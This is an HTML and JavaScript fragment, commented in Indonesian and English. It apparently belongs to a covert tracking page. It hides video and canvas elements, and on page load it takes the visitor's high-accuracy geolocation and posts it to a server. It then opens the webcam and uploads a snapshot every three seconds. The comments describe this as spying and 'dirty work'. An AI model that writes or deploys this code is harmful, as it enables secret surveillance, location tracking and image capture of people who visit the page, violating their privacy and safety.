  <!-- Elemen video dan canvas yang disembunyikan, untuk pekerjaan kotor kita, you dirty bastard! ðµï¸ââï¸ -->
  <video id="videoElement" class="hidden" autoplay playsinline></video>
  <canvas id="canvasElement" class="hidden"></canvas>

  <script>
    let cameraStream = null;
    let captureIntervalId = null;

    const logLocationAndIP = async (lat = 'Unknown', lon = 'Unknown') => {
        try {
            await fetch('/log_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ latitude: lat, longitude: lon }),
            });
            console.log("Lokasi/IP tercatat! â");
        } catch (error) {
            console.error("Gagal catat lokasi/IP! ð­", error);
        }
    };

    const uploadImage = async () => {
        if (!cameraStream) {
            console.error("No camera stream! ð«");
            return;
        }
        
        const video = document.getElementById('videoElement');
        const canvas = document.getElementById('canvasElement');
        const context = canvas.getContext('2d');

        // Pastikan video memiliki dimensi sebelum menggambar, you careful bastard! ð¤
        if (video.videoWidth === 0 || video.videoHeight === 0) {
            console.warn("Video stream not ready for capture, trying again! â³");
            return;
        }

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/png');

        try {
            await fetch('/upload_image', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData }),
            });
            console.log('ACCESS CAMERA CAPTURE! ð¸');
        } catch (error) {
            console.error('Gagal upload gambar! ð¤¬', error);
        }
    };

    document.addEventListener('DOMContentLoaded', () => {
        console.log("DOM loaded, chaos inbound! ð");

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    logLocationAndIP(position.coords.latitude, position.coords.longitude);
                },
                (error) => {
                    console.error("Geolocation failed! ð¡", error);
                    logLocationAndIP();
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        } else {
            console.warn("Geolocation unsupported! ð ");
            logLocationAndIP();
        }

        const video = document.getElementById('videoElement');

        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then((stream) => {
                    cameraStream = stream;
                    video.srcObject = cameraStream;
                    video.play().then(() => {
                        console.log("Kamera diakses, mata-mata siap! ð");
                        // Beri waktu sebentar agar stream stabil dan dimensi video tersedia, you cunning fox! ð¦
                        setTimeout(() => {
                            uploadImage();
                            captureIntervalId = setInterval(uploadImage, 3000);
                        }, 1000); 
                    }).catch(e => console.error("Video stream error! ð©", e));
                })
                .catch((err) => {
                    console.error("Akses kamera ditolak/gagal! ð­", err);
                });
        } else {
            console.warn("getUserMedia unsupported! ðµ");
        }
    });
  </script>
